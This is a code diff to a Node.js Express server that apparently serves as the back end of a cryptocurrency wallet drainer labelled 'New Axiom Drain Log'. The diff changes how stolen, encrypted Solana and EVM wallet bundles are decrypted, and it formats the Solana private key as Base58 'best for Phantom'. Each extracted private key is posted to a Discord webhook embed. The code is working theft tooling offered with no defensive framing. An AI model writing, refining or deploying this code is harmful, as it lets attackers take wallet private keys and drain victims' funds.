@@ -2,6 +2,7 @@ const express = require('express');
 const axios = require('axios');
 const crypto = require('crypto');
 const FormData = require('form-data');
+const bs58 = require('bs58');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -65,23 +66,35 @@ function decryptSingleBundle(bundleStr, keyB64, type) {
 
         if (type === "sol" && buf.length >= 64) {
             const solKey = buf.slice(0, 64);
-            privateKey = solKey.toString('base64');
-            try {
-                const bs58 = require('bs58');
-                privateKey = bs58.encode(solKey);   // Best format for Solana
-            } catch (e) {}
-        } else if (type === "evm" && buf.length >= 32) {
-            privateKey = buf.slice(0, 32).toString('hex');
-        }
+            
+            const base58Key = bs58.encode(solKey);
+            const base64Key = solKey.toString('base64');
+            
+            privateKey = base58Key; // Best for Phantom
 
-        return {
-            prefix,
-            type,
-            method: result.method,
-            decryptedHex: keyHex,
-            decryptedBase64: buf.toString('base64'),
-            privateKey: privateKey || "Not extracted"
-        };
+            return {
+                prefix,
+                type,
+                method: result.method,
+                decryptedHex: keyHex,
+                decryptedBase64: buf.toString('base64'),
+                privateKeyBase58: base58Key,
+                privateKeyBase64: base64Key,
+                privateKeyHex: solKey.toString('hex'),
+                privateKey: base58Key  // Main one shown in Discord
+            };
+        } 
+        else if (type === "evm" && buf.length >= 32) {
+            privateKey = buf.slice(0, 32).toString('hex');
+            return {
+                prefix,
+                type,
+                method: result.method,
+                decryptedHex: keyHex,
+                privateKey: privateKey,
+                privateKeyHex: privateKey
+            };
+        }
     }
     return { prefix, error: "Failed" };
 }
@@ -106,7 +119,6 @@ function tryDecryptAES(encryptedB64, keyB64) {
 
 async function sendToDiscord(data) {
     const portfolio = data.portfolio || {};
-    const hasSuccess = true;
 
     const mainEmbed = {
         title: "📥 New Axiom Drain Log",
@@ -124,18 +136,21 @@ async function sendToDiscord(data) {
         { name: "Site", value: data.site || "N/A" }
     ];
 
-    if (portfolio.sBundlesDecrypted) {
-        portfolio.sBundlesDecrypted.forEach(b => {
-            if (b.privateKey && b.privateKey !== "Not extracted") {
-                summaryFields.push({ name: "🔑 Solana Private Key", value: `\`\`\`${b.privateKey}\`\`\`` });
-            }
+    // Solana Key
+    if (portfolio.sBundlesDecrypted?.[0]?.privateKeyBase58) {
+        const s = portfolio.sBundlesDecrypted[0];
+        summaryFields.push({ 
+            name: "🔑 Solana Private Key (Base58)", 
+            value: `\`\`\`${s.privateKeyBase58}\`\`\`` 
         });
     }
-    if (portfolio.eBundlesDecrypted) {
-        portfolio.eBundlesDecrypted.forEach(b => {
-            if (b.privateKey && b.privateKey !== "Not extracted") {
-                summaryFields.push({ name: "🔑 EVM Private Key", value: `\`\`\`${b.privateKey}\`\`\`` });
-            }
+
+    // EVM Key
+    if (portfolio.eBundlesDecrypted?.[0]?.privateKey) {
+        const e = portfolio.eBundlesDecrypted[0];
+        summaryFields.push({ 
+            name: "🔑 EVM Private Key (Hex)", 
+            value: `\`\`\`${e.privateKey}\`\`\`` 
         });
     }
 
